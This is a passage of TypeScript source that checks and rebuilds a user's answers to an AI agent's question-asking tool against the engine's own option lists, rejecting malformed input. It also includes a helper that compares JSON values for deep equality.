 * `answers: Record<questionText, answerString>` from a renderer answer frame,
 * validated against the ENGINE's own gated questions. Option indices are
 * resolved to the engine's own labels (C1 byte-fidelity); the built-in "Other…"
 * freeform text is the only renderer-authored byte (bounded, model-visible text
 * only). Fail-closed on any structural mismatch; the request stays pending.
 */
function reconstructAskUserQuestionAnswers(
  gatedInput: Record<string, unknown> | undefined,
  answers: AskUserQuestionAnswerMessage['answers'],
): AskUserQuestionReconstructResult {
  const questions = narrowGatedQuestions(gatedInput)
  if (!questions) {
    return { ok: false, reason: 'gated AskUserQuestion input has no questions' }
  }
  if (answers.length !== questions.length) {
    return {
      ok: false,
      reason: 'answers length does not match the questions asked',
    }
  }

  const map: Record<string, string> = {}
  for (let qi = 0; qi < questions.length; qi++) {
    const question = questions[qi]!
    const answer = answers[qi]!
    const other = answer.other?.trim()
    const hasOther = other !== undefined && other.length > 0
    const indices = answer.optionIndices

    // Every index must select a real, distinct engine-minted option.
    const seen = new Set<number>()
    for (const index of indices) {
      if (index >= question.options.length) {
        return {
          ok: false,
          reason: `option index ${index} is out of range for question ${qi}`,
        }
      }
      if (seen.has(index)) {
        return {
          ok: false,
          reason: `duplicate option index ${index} for question ${qi}`,
        }
      }
      seen.add(index)
    }

    const componentCount = indices.length + (hasOther ? 1 : 0)
    if (componentCount === 0) {
      return { ok: false, reason: `question ${qi} has no answer` }
    }
    // Single-select accepts at most one component total (one option OR the
    // freeform), mirroring the tool's own UI cardinality; multi-select joins.
    if (!question.multiSelect && componentCount > 1) {
      return {
        ok: false,
        reason: `question ${qi} is single-select but got multiple answers`,
      }
    }

    // Labels from the ENGINE (index selection), freeform from the bounded wire,
    // joined ", " per the tool's outputSchema (multi answers comma-separated).
    const parts = indices.map(index => question.options[index]!)
    if (hasOther) parts.push(other)
    map[question.question] = parts.join(', ')
  }

  return { ok: true, answers: map }
}

/** Structural deep equality for JSON-shaped values (T6 echo check). */
function deepEqual(a: unknown, b: unknown): boolean {
  if (a === b) return true
  if (typeof a !== typeof b) return false
  if (a === null || b === null) return a === b
  if (typeof a !== 'object') return false

  const aArr = Array.isArray(a)
  const bArr = Array.isArray(b)
  if (aArr !== bArr) return false

  if (aArr && bArr) {
    if (a.length !== b.length) return false
    return a.every((item, i) => deepEqual(item, b[i]))
  }

  const aObj = a as Record<string, unknown>
  const bObj = b as Record<string, unknown>
  const aKeys = Object.keys(aObj)
  const bKeys = Object.keys(bObj)
  if (aKeys.length !== bKeys.length) return false
  return aKeys.every(key => key in bObj && deepEqual(aObj[key], bObj[key]))
}
